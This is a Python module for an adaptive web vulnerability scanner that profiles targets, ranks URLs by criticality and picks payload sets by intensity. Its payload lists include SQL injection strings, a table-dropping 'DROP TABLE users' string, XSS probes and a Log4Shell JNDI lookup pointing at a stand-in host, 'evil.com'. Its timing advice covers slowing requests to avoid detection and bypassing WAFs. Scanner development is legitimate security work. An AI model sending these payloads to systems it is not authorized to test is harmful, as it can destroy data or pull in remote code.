#!/usr/bin/env python3
"""
Adaptive Scanner for intelligent vulnerability scanning.

This module implements adaptive scanning capabilities that adjust the scanning
approach based on initial findings and target characteristics.
"""

from __future__ import annotations
import json
import os
from typing import List, Dict, Any, Optional, Set
from collections import defaultdict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time
import asyncio

class AdaptiveScanner:
    """Adaptive scanner that adjusts its approach based on findings and target characteristics."""
    
    def __init__(self, outdir: str, scope: Any = None):
        self.outdir = outdir
        self.scope = scope
        self.findings_cache: List[Dict[str, Any]] = []
        self.target_profiles: Dict[str, Dict[str, Any]] = {}
        self.scan_history: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
        self.adaptation_rules = self._load_adaptation_rules()
        self.asset_criticality_map: Dict[str, float] = {}
        self.network_conditions: Dict[str, Any] = {}
        self.system_load: float = 0.0
        
    def _load_adaptation_rules(self) -> Dict[str, Any]:
        """Load adaptation rules for different scenarios."""
        return {
            "sqli": {
                "escalate_on_findings": ["sqli-error", "sqli-blind"],
                "reduce_on_stability": ["sqli-timeout", "sqli-error"],
                "adjust_payloads": {
                    "sqli-error": ["error-based"],
                    "sqli-blind": ["time-based", "boolean-based"],
                    "sqli-none": ["light"]
                }
            },
            "xss": {
                "escalate_on_findings": ["xss-reflected", "xss-stored"],
                "reduce_on_stability": ["xss-timeout", "xss-error"],
                "adjust_payloads": {
                    "xss-reflected": ["reflected"],
                    "xss-stored": ["stored"],
                    "xss-none": ["light"]
                }
            },
            "target_profiling": {
                "waf_indicators": ["cloudflare", "akamai", "imperva"],
                "framework_indicators": {
                    "wordpress": ["/wp-content/", "/wp-admin/"],
                    "drupal": ["/sites/default/"],
                    "joomla": ["/components/com_"]
                }
            },
            "risk_scoring": {
                "severity_weights": {
                    "critical": 5.0,
                    "high": 4.0,
                    "medium": 3.0,
                    "low": 2.0,
                    "info": 1.0
                },
                "exploitability_factors": {
                    "rce": 1.0,
                    "sqli": 0.9,
                    "xss": 0.8,
                    "csrf": 0.7,
                    "info_disclosure": 0.6
                }
            }
        }
    
    def load_previous_findings(self) -> List[Dict[str, Any]]:
        """Load findings from previous scans to inform adaptive decisions."""
        findings = []
        
        # Load findings from various sources
        finding_files = [
            "sqli.json",
            "xss.json",
            "rce.json",
            "generated/tools/*.json"
        ]
        
        for file_pattern in finding_files:
            if "*" in file_pattern:
                # Handle glob patterns
                import glob
                pattern = os.path.join(self.outdir, file_pattern)
                for file_path in glob.glob(pattern):
                    try:
                        with open(file_path, "r") as f:
                            data = json.load(f)
                            if isinstance(data, list):
                                findings.extend(data)
                            elif isinstance(data, dict) and "findings" in data:
                                findings.extend(data["findings"])
                    except Exception:
                        continue
            else:
                file_path = os.path.join(self.outdir, file_pattern)
                if os.path.exists(file_path):
                    try:
                        with open(file_path, "r") as f:
                            data = json.load(f)
                            if isinstance(data, list):
                                findings.extend(data)
                            elif isinstance(data, dict) and "findings" in data:
                                findings.extend(data["findings"])
                    except Exception:
                        continue
        
        self.findings_cache = findings
        return findings
    
    def profile_target(self, url: str) -> Dict[str, Any]:
        """Profile a target to determine optimal scanning approach."""
        if url in self.target_profiles:
            return self.target_profiles[url]
        
        profile = {
            "url": url,
            "waf_detected": False,
            "framework": "unknown",
            "response_time_avg": 0,
            "error_rate": 0,
            "security_headers": [],
            "vulnerability_history": []
        }
        
        try:
            # Simple target profiling based on previous findings
            target_findings = [f for f in self.findings_cache if f.get("target", "") == url]
            
            # Check for WAF indicators in findings
            waf_indicators = self.adaptation_rules["target_profiling"]["waf_indicators"]
            for finding in target_findings:
                evidence = str(finding.get("evidence", "")).lower()
                if any(waf in evidence for waf in waf_indicators):
                    profile["waf_detected"] = True
                    break
            
            # Check for framework indicators
            framework_indicators = self.adaptation_rules["target_profiling"]["framework_indicators"]
            for framework, indicators in framework_indicators.items():
                for finding in target_findings:
                    target_url = finding.get("target", "")
                    if any(indicator in target_url for indicator in indicators):
                        profile["framework"] = framework
                        break
                if profile["framework"] != "unknown":
                    break
            
            # Calculate error rate from findings
            error_findings = [f for f in target_findings if "error" in f.get("type", "")]
            if target_findings:
                profile["error_rate"] = len(error_findings) / len(target_findings)
            
            # Get vulnerability history
            vuln_findings = [f for f in target_findings if f.get("severity", 0) > 1]
            profile["vulnerability_history"] = [
                {
                    "type": f.get("type"),
                    "severity": f.get("severity"),
                    "confidence": f.get("confidence")
                }
                for f in vuln_findings
            ]
            
        except Exception:
            pass
        
        self.target_profiles[url] = profile
        return profile
    
    def get_adaptive_scan_config(self, scanner_type: str, target: str) -> Dict[str, Any]:
        """Get adaptive configuration for a specific scanner and target."""
        # Load findings if not already loaded
        if not self.findings_cache:
            self.load_previous_findings()
        
        # Profile the target
        target_profile = self.profile_target(target)
        
        # Base configuration
        config = {
            "timeout": 10,
            "retries": 2,
            "payload_intensity": "normal",
            "rate_limiting": False,
            "waf_bypass": False,
            "framework_specific": False
        }
        
        # Adjust based on target profile
        if target_profile["waf_detected"]:
            config["waf_bypass"] = True
            config["rate_limiting"] = True
            config["payload_intensity"] = "light"
            config["timeout"] = 15
        
        if target_profile["framework"] != "unknown":
            config["framework_specific"] = True
            config["payload_intensity"] = "targeted"
        
        # Adjust based on previous findings for this scanner type
        scanner_findings = [
            f for f in self.findings_cache 
            if f.get("type", "").startswith(scanner_type) and f.get("target") == target
        ]
        
        if scanner_findings:
            # Check if we should escalate or reduce scanning
            escalate_types = self.adaptation_rules.get(scanner_type, {}).get("escalate_on_findings", [])
            reduce_types = self.adaptation_rules.get(scanner_type, {}).get("reduce_on_stability", [])
            
            found_escalation = any(f.get("type") in escalate_types for f in scanner_findings)
            found_reduction = any(f.get("type") in reduce_types for f in scanner_findings)
            
            if found_escalation and not found_reduction:
                config["payload_intensity"] = "intensive"
                config["retries"] = 3
            elif found_reduction and not found_escalation:
                config["payload_intensity"] = "light"
                config["timeout"] = 5
                config["retries"] = 1
        
        # Adjust payloads based on finding types
        if scanner_type in self.adaptation_rules:
            payload_mapping = self.adaptation_rules[scanner_type].get("adjust_payloads", {})
            for finding in scanner_findings:
                finding_type = finding.get("type", "")
                if finding_type in payload_mapping:
                    config["payload_intensity"] = payload_mapping[finding_type][0]
                    break
        
        return config
    
    def get_adaptive_payloads(self, scanner_type: str, target: str) -> List[str]:
        """Get adaptive payloads based on target profile and previous findings."""
        config = self.get_adaptive_scan_config(scanner_type, target)
        intensity = config["payload_intensity"]
        
        # Simplified payload selection - in a real implementation, this would
        # load specific payloads from files or modules
        payload_sets = {
            "light": ["' OR '1'='1", "<script>alert(1)</script>"],
            "normal": ["' OR '1'='1", "<script>alert(1)</script>", "UNION SELECT NULL", "admin'--"],
            "intensive": [
                "' OR '1'='1", 
                "<script>alert(1)</script>", 
                "UNION SELECT NULL", 
                "admin'--",
                "'; DROP TABLE users; --",
                "<img src=x onerror=alert(1)>",
                "${jndi:ldap://evil.com/a}"
            ],
            "targeted": []  # Would be populated based on framework
        }
        
        return payload_sets.get(intensity, payload_sets["normal"])
    
    def should_scan_target(self, target: str, scanner_type: str) -> bool:
        """Determine if a target should be scanned with a specific scanner."""
        # Load findings if not already loaded
        if not self.findings_cache:
            self.load_previous_findings()
        
        # Get target profile
        target_profile = self.profile_target(target)
        
        # Don't scan if error rate is too high
        if target_profile["error_rate"] > 0.5:
            return False
        
        # Always scan critical targets
        critical_paths = ["/admin", "/login", "/api", "/payment"]
        if any(path in target for path in critical_paths):
            return True
        
        # Don't scan if we've already found critical vulnerabilities
        critical_findings = [
            f for f in self.findings_cache 
            if f.get("target") == target and f.get("severity", 0) >= 4
        ]
        if critical_findings and scanner_type not in ["sqli", "xss", "rce"]:
            return False
        
        return True
    
    def prioritize_targets(self, targets: List[str]) -> List[str]:
        """Prioritize targets based on comprehensive risk assessment."""
        # Load findings if not already loaded
        if not self.findings_cache:
            self.load_previous_findings()
        
        def target_risk_score(target: str) -> float:
            # Base score
            score = 1.0
            
            # Check for previous findings
            target_findings = [f for f in self.findings_cache if f.get("target") == target]
            if target_findings:
                # Higher score for targets with vulnerabilities
                vuln_findings = [f for f in target_findings if f.get("severity", 0) > 1]
                score += len(vuln_findings) * 2
                
                # Even higher score for high severity findings
                high_sev_findings = [f for f in vuln_findings if f.get("severity", 0) >= 4]
                score += len(high_sev_findings) * 3
            
            # Check for critical paths
            critical_paths = ["/admin", "/login", "/api", "/payment", "/user"]
            if any(path in target for path in critical_paths):
                score += 5
            
            # Add asset criticality factor
            asset_criticality = self.get_asset_criticality(target)
            score *= asset_criticality
            
            # Add network condition factor
            network_factor = self.get_network_condition_factor(target)
            score *= network_factor
            
            return score
        
        # Sort targets by risk score (descending)
        return sorted(targets, key=target_risk_score, reverse=True)
    
    def get_scan_strategy(self, targets: List[str]) -> Dict[str, Any]:
        """Get overall scan strategy based on all targets and findings."""
        # Load findings if not already loaded
        if not self.findings_cache:
            self.load_previous_findings()
        
        strategy = {
            "scan_order": self.prioritize_targets(targets),
            "parallel_scans": min(len(targets), 5),  # Limit concurrent scans
            "rate_limiting": False,
            "waf_aware": False
        }
        
        # Check if any target has WAF
        for target in targets:
            profile = self.profile_target(target)
            if profile["waf_detected"]:
                strategy["waf_aware"] = True
                strategy["rate_limiting"] = True
                strategy["parallel_scans"] = 1  # Reduce to 1 for WAF safety
                break
        
        # Check overall error rate
        total_findings = len(self.findings_cache)
        error_findings = len([f for f in self.findings_cache if "error" in f.get("type", "")])
        if total_findings > 0 and error_findings / total_findings > 0.3:
            strategy["rate_limiting"] = True
            strategy["parallel_scans"] = 1
        
        return strategy
    
    def get_asset_criticality(self, target: str) -> float:
        """Get asset criticality score for a target (1.0 to 5.0)."""
        # Check if we have a precomputed criticality score
        if target in self.asset_criticality_map:
            return self.asset_criticality_map[target]
        
        # Default criticality based on path patterns
        critical_paths = {
            5.0: ["/admin", "/api", "/payment"],
            4.0: ["/login", "/user", "/account"],
            3.0: ["/dashboard", "/profile", "/settings"],
            2.0: ["/blog", "/news", "/about"],
            1.0: []  # Default
        }
        
        for score, paths in critical_paths.items():
            if any(path in target for path in paths):
                self.asset_criticality_map[target] = score
                return score
        
        # Default criticality
        self.asset_criticality_map[target] = 1.0
        return 1.0
    
    def set_asset_criticality(self, target: str, criticality: float) -> None:
        """Set asset criticality for a target (1.0 to 5.0)."""
        self.asset_criticality_map[target] = max(1.0, min(5.0, criticality))
    
    def load_asset_criticality_from_context(self, context: Dict[str, Any]) -> None:
        """Load asset criticality information from context."""
        critical_assets = context.get("critical_assets", [])
        asset_values = context.get("asset_values", {})
        
        # Set critical assets to highest criticality
        for asset in critical_assets:
            self.set_asset_criticality(asset, 5.0)
        
        # Set specific asset values
        for asset, value in asset_values.items():
            self.set_asset_criticality(asset, value)
    
    def assess_asset_criticality_automatically(self, targets: List[str]) -> None:
        """Automatically assess asset criticality based on common patterns."""
        for target in targets:
            # If not already assessed, use automatic assessment
            if target not in self.asset_criticality_map:
                criticality = self._auto_assess_criticality(target)
                self.set_asset_criticality(target, criticality)
    
    def _auto_assess_criticality(self, target: str) -> float:
        """Automatically assess criticality based on URL patterns."""
        target_lower = target.lower()
        
        # Critical systems (5.0)
        critical_patterns = [
            "/admin", "/api", "/payment", "/finance", "/banking", 
            "/user/manage", "/system/config", "/root", "/admin"
        ]
        if any(pattern in target_lower for pattern in critical_patterns):
            return 5.0
        
        # High importance (4.0)
        high_patterns = [
            "/login", "/user", "/account", "/profile", "/settings",
            "/cart", "/checkout", "/order", "/purchase"
        ]
        if any(pattern in target_lower for pattern in high_patterns):
            return 4.0
        
        # Medium importance (3.0)
        medium_patterns = [
            "/dashboard", "/reports", "/analytics", "/search",
            "/upload", "/download", "/files"
        ]
        if any(pattern in target_lower for pattern in medium_patterns):
            return 3.0
        
        # Low importance (2.0)
        low_patterns = [
            "/blog", "/news", "/about", "/contact", "/help",
            "/terms", "/privacy", "/static", "/public"
        ]
        if any(pattern in target_lower for pattern in low_patterns):
            return 2.0
        
        # Default (1.0)
        return 1.0
    
    def get_asset_network_importance(self, target: str) -> float:
        """Assess network importance of an asset."""
        # In a real implementation, this would check network topology
        # For now, we'll use a simple heuristic based on URL structure
        target_lower = target.lower()
        
        # Assets with many parameters or complex paths are more network important
        if "?" in target and "&" in target:
            return 1.5  # More complex URLs are more important
        
        # API endpoints are typically more network important
        if "/api/" in target_lower or target_lower.endswith(".json") or target_lower.endswith(".xml"):
            return 1.3
        
        return 1.0
    
    def get_comprehensive_asset_score(self, target: str) -> Dict[str, Any]:
        """Get comprehensive asset scoring information."""
        return {
            "criticality": self.get_asset_criticality(target),
            "network_importance": self.get_asset_network_importance(target),
            "business_impact": self._calculate_business_impact(target),
            "exploitability": self._calculate_exploitability_factor(target, []),
            "auto_assessed": target not in self.asset_criticality_map
        }
    
    def get_network_condition_factor(self, target: str) -> float:
        """Get network condition factor for a target (0.5 to 2.0)."""
        # Simulate network condition assessment
        # In a real implementation, this would check actual network metrics
        return 1.0  # Default neutral factor
    
    def update_system_load(self, load: float) -> None:
        """Update the current system load metric."""
        self.system_load = max(0.0, min(1.0, load))  # Normalize to 0.0-1.0
    
    def update_target_availability(self, target: str, is_available: bool) -> None:
        """Update target availability status."""
        if target not in self.target_profiles:
            self.target_profiles[target] = {}
        self.target_profiles[target]["available"] = is_available
        self.target_profiles[target]["last_checked"] = time.time()
    
    def check_target_availability(self, target: str) -> bool:
        """Check if a target is available."""
        # If we have recent availability info, use it
        if target in self.target_profiles:
            profile = self.target_profiles[target]
            last_checked = profile.get("last_checked", 0)
            # If checked within last 5 minutes, use cached result
            if time.time() - last_checked < 300:
                return profile.get("available", True)
        
        # Otherwise, assume available (in a real implementation, we would actually check)
        self.update_target_availability(target, True)
        return True
    
    def get_dynamic_scan_strategy(self, targets: List[str]) -> Dict[str, Any]:
        """Get dynamic scan strategy based on real-time conditions."""
        # Load findings if not already loaded
        if not self.findings_cache:
            self.load_previous_findings()
        
        # Base strategy
        strategy = {
            "scan_order": self.prioritize_targets(targets),
            "parallel_scans": min(len(targets), 5),  # Default limit
            "rate_limiting": False,
            "waf_aware": False,
            "adaptive_timing": "normal",
            "payload_intensity": "normal"
        }
        
        # Check if any target has WAF
        for target in targets:
            profile = self.profile_target(target)
            if profile["waf_detected"]:
                strategy["waf_aware"] = True
                strategy["rate_limiting"] = True
                strategy["parallel_scans"] = 1  # Reduce to 1 for WAF safety
                strategy["adaptive_timing"] = "slow"
                strategy["payload_intensity"] = "light"
                break
        
        # Check overall error rate
        total_findings = len(self.findings_cache)
        error_findings = len([f for f in self.findings_cache if "error" in f.get("type", "")])
        if total_findings > 0 and error_findings / total_findings > 0.3:
            strategy["rate_limiting"] = True
            strategy["parallel_scans"] = 1
            strategy["adaptive_timing"] = "slow"
        
        # Adjust based on system load
        if self.system_load > 0.8:  # High system load
            strategy["parallel_scans"] = max(1, strategy["parallel_scans"] // 2)
            strategy["rate_limiting"] = True
            strategy["adaptive_timing"] = "slow"
        elif self.system_load > 0.5:  # Medium system load
            strategy["parallel_scans"] = max(1, strategy["parallel_scans"] - 1)
            strategy["adaptive_timing"] = "normal"
        else:  # Low system load
            strategy["adaptive_timing"] = "fast"
            strategy["payload_intensity"] = "intensive"
        
        # Adjust based on high-risk targets
        high_risk_targets = [t for t in strategy["scan_order"] if self.get_asset_criticality(t) >= 4.0]
        if high_risk_targets:
            # Ensure high-risk targets are scanned first with appropriate intensity
            strategy["payload_intensity"] = "intensive"
        
        return strategy
    
    def should_scan_target_realtime(self, target: str, scanner_type: str, current_findings: List[Dict]) -> bool:
        """Make real-time decision whether to scan a target based on current conditions."""
        # Check target profile
        target_profile = self.profile_target(target)
        
        # Don't scan if error rate is too high
        if target_profile["error_rate"] > 0.5:
            return False
        
        # Always scan critical targets
        critical_paths = ["/admin", "/login", "/api", "/payment"]
        if any(path in target for path in critical_paths):
            return True
        
        # Don't scan if we've already found critical vulnerabilities on this target
        critical_findings = [
            f for f in current_findings 
            if f.get("target") == target and f.get("severity", 0) >= 4
        ]
        if critical_findings and scanner_type not in ["sqli", "xss", "rce"]:
            return False
        
        # Adjust based on system load
        if self.system_load > 0.8 and scanner_type in ["sqli", "rce"]:
            # Reduce intensive scanning under high load
            return False
        
        return True
    
    def get_realtime_adaptive_config(self, scanner_type: str, target: str, 
                                   current_findings: List[Dict]) -> Dict[str, Any]:
        """Get adaptive configuration in real-time based on current conditions."""
        # Base configuration
        config = {
            "timeout": 10,
            "retries": 2,
            "payload_intensity": "normal",
            "rate_limiting": False,
            "waf_bypass": False,
            "framework_specific": False,
            "timing": "normal"
        }
        
        # Profile the target
        target_profile = self.profile_target(target)
        
        # Adjust based on target profile
        if target_profile["waf_detected"]:
            config["waf_bypass"] = True
            config["rate_limiting"] = True
            config["payload_intensity"] = "light"
            config["timeout"] = 15
            config["timing"] = "slow"
        
        if target_profile["framework"] != "unknown":
            config["framework_specific"] = True
            config["payload_intensity"] = "targeted"
        
        # Adjust based on current findings for this scanner type
        scanner_findings = [
            f for f in current_findings 
            if f.get("type", "").startswith(scanner_type) and f.get("target") == target
        ]
        
        if scanner_findings:
            # Check if we should escalate or reduce scanning
            escalate_types = self.adaptation_rules.get(scanner_type, {}).get("escalate_on_findings", [])
            reduce_types = self.adaptation_rules.get(scanner_type, {}).get("reduce_on_stability", [])
            
            found_escalation = any(f.get("type") in escalate_types for f in scanner_findings)
            found_reduction = any(f.get("type") in reduce_types for f in scanner_findings)
            
            if found_escalation and not found_reduction:
                config["payload_intensity"] = "intensive"
                config["retries"] = 3
                config["timing"] = "fast"
            elif found_reduction and not found_escalation:
                config["payload_intensity"] = "light"
                config["timeout"] = 5
                config["retries"] = 1
                config["timing"] = "slow"
        
        # Adjust payloads based on finding types
        if scanner_type in self.adaptation_rules:
            payload_mapping = self.adaptation_rules[scanner_type].get("adjust_payloads", {})
            for finding in scanner_findings:
                finding_type = finding.get("type", "")
                if finding_type in payload_mapping:
                    config["payload_intensity"] = payload_mapping[finding_type][0]
                    break
        
        # Adjust based on system load
        if self.system_load > 0.8:
            config["timing"] = "slow"
            config["payload_intensity"] = "light"
        elif self.system_load < 0.3:
            config["timing"] = "fast"
            config["payload_intensity"] = "intensive"
        
        return config
    
    def calculate_comprehensive_risk_score(self, target: str) -> float:
        """Calculate comprehensive risk score for a target based on multiple factors."""
        # Load findings if not already loaded
        if not self.findings_cache:
            self.load_previous_findings()
        
        # Base score
        score = 1.0
        
        # Factor 1: Previous findings (severity weighted)
        target_findings = [f for f in self.findings_cache if f.get("target") == target]
        if target_findings:
            # Weighted severity score
            severity_score = 0
            for finding in target_findings:
                severity = finding.get("severity", 1)
                confidence = finding.get("confidence", 0.5)
                severity_score += severity * confidence
            
            score += severity_score * 2  # Amplify findings factor
            
            # Bonus for critical findings
            critical_findings = [f for f in target_findings if f.get("severity", 0) >= 4]
            score += len(critical_findings) * 5
        
        # Factor 2: Asset criticality (1.0 to 5.0)
        asset_criticality = self.get_asset_criticality(target)
        score *= asset_criticality
        
        # Factor 3: Exploitability potential
        exploitability_factor = self._calculate_exploitability_factor(target, target_findings)
        score *= exploitability_factor
        
        # Factor 4: Business impact
        business_impact = self._calculate_business_impact(target)
        score *= business_impact
        
        # Factor 5: Network conditions
        network_factor = self.get_network_condition_factor(target)
        score *= network_factor
        
        # Cap the score
        return min(score, 100.0)
    
    def _calculate_exploitability_factor(self, target: str, findings: List[Dict]) -> float:
        """Calculate exploitability factor based on vulnerability types."""
        # Default factor
        factor = 1.0
        
        # High exploitability vulnerability types
        high_exploitability = ["rce", "sqli", "command"]
        medium_exploitability = ["xss", "csrf", "file-inclusion"]
        low_exploitability = ["info-disclosure", "weak-crypto"]
        
        # Check findings for exploitability indicators
        for finding in findings:
            vuln_type = finding.get("type", "").lower()
            if any(he in vuln_type for he in high_exploitability):
                factor = max(factor, 2.0)
            elif any(me in vuln_type for me in medium_exploitability):
                factor = max(factor, 1.5)
            elif any(le in vuln_type for le in low_exploitability):
                factor = max(factor, 1.2)
        
        return factor
    
    def _calculate_business_impact(self, target: str) -> float:
        """Calculate business impact factor based on target path."""
        target_lower = target.lower()
        
        # High impact paths
        high_impact = ["/payment", "/api", "/admin", "/login", "/user", "/account", "/checkout"]
        if any(path in target_lower for path in high_impact):
            return 2.0
        
        # Medium impact paths
        medium_impact = ["/dashboard", "/profile", "/settings", "/cart"]
        if any(path in target_lower for path in medium_impact):
            return 1.5
        
        # Low impact paths
        low_impact = ["/blog", "/news", "/about", "/contact"]
        if any(path in target_lower for path in low_impact):
            return 1.2
        
        # Default
        return 1.0
    
    def prioritize_targets_comprehensive(self, targets: List[str]) -> List[str]:
        """Prioritize targets using comprehensive risk-based scoring."""
        # Load findings if not already loaded
        if not self.findings_cache:
            self.load_previous_findings()
        
        def target_risk_score(target: str) -> float:
            return self.calculate_comprehensive_risk_score(target)
        
        # Sort targets by comprehensive risk score (descending)
        return sorted(targets, key=target_risk_score, reverse=True)
    
    def get_dynamic_scheduling_strategy(self, targets: List[str]) -> Dict[str, Any]:
        """Get dynamic scheduling strategy based on availability, network conditions, and system load."""
        # Load findings if not already loaded
        if not self.findings_cache:
            self.load_previous_findings()
        
        # Assess asset criticality for all targets
        self.assess_asset_criticality_automatically(targets)
        
        # Base strategy with comprehensive prioritization
        strategy = {
            "scan_order": self.prioritize_targets_comprehensive(targets),
            "parallel_scans": min(len(targets), 5),  # Default limit
            "rate_limiting": False,
            "waf_aware": False,
            "adaptive_timing": "normal",
            "payload_intensity": "normal",
            "schedule_adjustments": []
        }
        
        # Check availability and filter unavailable targets
        available_targets = [t for t in strategy["scan_order"] if self.check_target_availability(t)]
        strategy["scan_order"] = available_targets
        if len(available_targets) < len(strategy["scan_order"]):
            strategy["schedule_adjustments"].append(f"Removed {len(strategy['scan_order']) - len(available_targets)} unavailable targets")
        
        # Check if any target has WAF
        waf_detected = False
        for target in available_targets:
            profile = self.profile_target(target)
            if profile["waf_detected"]:
                waf_detected = True
                strategy["waf_aware"] = True
                strategy["rate_limiting"] = True
                strategy["parallel_scans"] = 1  # Reduce to 1 for WAF safety
                strategy["adaptive_timing"] = "slow"
                strategy["payload_intensity"] = "light"
                break
        
        # Check overall error rate
        total_findings = len(self.findings_cache)
        error_findings = len([f for f in self.findings_cache if "error" in f.get("type", "")])
        if total_findings > 0 and error_findings / total_findings > 0.3:
            strategy["rate_limiting"] = True
            strategy["parallel_scans"] = 1
            strategy["adaptive_timing"] = "slow"
            strategy["schedule_adjustments"].append("High error rate detected, reducing parallel scans")
        
        # Adjust based on system load
        if self.system_load > 0.8:  # High system load
            strategy["parallel_scans"] = max(1, strategy["parallel_scans"] // 2)
            strategy["rate_limiting"] = True
            strategy["adaptive_timing"] = "slow"
            strategy["schedule_adjustments"].append("High system load, reducing parallel scans")
        elif self.system_load > 0.5:  # Medium system load
            strategy["parallel_scans"] = max(1, strategy["parallel_scans"] - 1)
            strategy["adaptive_timing"] = "normal"
        else:  # Low system load
            strategy["adaptive_timing"] = "fast"
            strategy["payload_intensity"] = "intensive"
        
        # Adjust based on high-risk targets
        high_risk_targets = [t for t in strategy["scan_order"] if self.get_asset_criticality(t) >= 4.0]
        if high_risk_targets:
            # Ensure high-risk targets are scanned first with appropriate intensity
            strategy["payload_intensity"] = "intensive"
            strategy["schedule_adjustments"].append(f"Prioritizing {len(high_risk_targets)} high-risk targets")
        
        # Network condition adjustments
        avg_network_factor = sum(self.get_network_condition_factor(t) for t in available_targets) / len(available_targets) if available_targets else 1.0
        if avg_network_factor < 0.8:  # Poor network conditions
            strategy["rate_limiting"] = True
            strategy["parallel_scans"] = max(1, strategy["parallel_scans"] - 1)
            strategy["adaptive_timing"] = "slow"
            strategy["schedule_adjustments"].append("Poor network conditions detected")
        
        # Add timing recommendations
        strategy["timing_recommendations"] = self._generate_timing_recommendations(strategy)
        
        return strategy
    
    def _generate_timing_recommendations(self, strategy: Dict[str, Any]) -> List[str]:
        """Generate timing recommendations based on strategy."""
        recommendations = []
        
        if strategy["adaptive_timing"] == "slow":
            recommendations.append("Use longer delays between requests to avoid detection")
        elif strategy["adaptive_timing"] == "fast":
            recommendations.append("Can use aggressive timing for faster scanning")
        
        if strategy["rate_limiting"]:
            recommendations.append("Implement strict rate limiting to prevent blocking")
        
        if strategy["waf_aware"]:
            recommendations.append("Use WAF-aware scanning techniques and obfuscation")
        
        if strategy["parallel_scans"] == 1:
            recommendations.append("Sequential scanning recommended to minimize impact")
        elif strategy["parallel_scans"] > 3:
            recommendations.append("Parallel scanning can be aggressive, monitor for issues")
        
        return recommendations
    
    def get_scan_batch_recommendation(self, targets: List[str], batch_size: int = 10) -> List[List[str]]:
        """Get recommended batched scanning approach."""
        # Get dynamic scheduling strategy
        strategy = self.get_dynamic_scheduling_strategy(targets)
        prioritized_targets = strategy["scan_order"]
        
        # Create batches based on priority and constraints
        batches = []
        for i in range(0, len(prioritized_targets), batch_size):
            batch = prioritized_targets[i:i + batch_size]
            batches.append(batch)
        
        return batches

# Global adaptive scanner instance
_adaptive_scanner: Optional[AdaptiveScanner] = None

def get_adaptive_scanner(outdir: str, scope: Any = None) -> AdaptiveScanner:
    """Get or create the global adaptive scanner instance."""
    global _adaptive_scanner
    if _adaptive_scanner is None:
        _adaptive_scanner = AdaptiveScanner(outdir, scope)
    return _adaptive_scanner

def get_adaptive_config(scanner_type: str, target: str, outdir: str, scope: Any = None) -> Dict[str, Any]:
    """Get adaptive configuration for a scanner."""
    scanner = get_adaptive_scanner(outdir, scope)
    return scanner.get_adaptive_scan_config(scanner_type, target)

def get_adaptive_payloads(scanner_type: str, target: str, outdir: str, scope: Any = None) -> List[str]:
    """Get adaptive payloads for a scanner."""
    scanner = get_adaptive_scanner(outdir, scope)
    return scanner.get_adaptive_payloads(scanner_type, target)

def should_scan_target(target: str, scanner_type: str, outdir: str, scope: Any = None) -> bool:
    """Determine if a target should be scanned."""
    scanner = get_adaptive_scanner(outdir, scope)
    return scanner.should_scan_target(target, scanner_type)

def get_scan_strategy(targets: List[str], outdir: str, scope: Any = None) -> Dict[str, Any]:
    """Get overall scan strategy."""
    scanner = get_adaptive_scanner(outdir, scope)
    return scanner.get_scan_strategy(targets)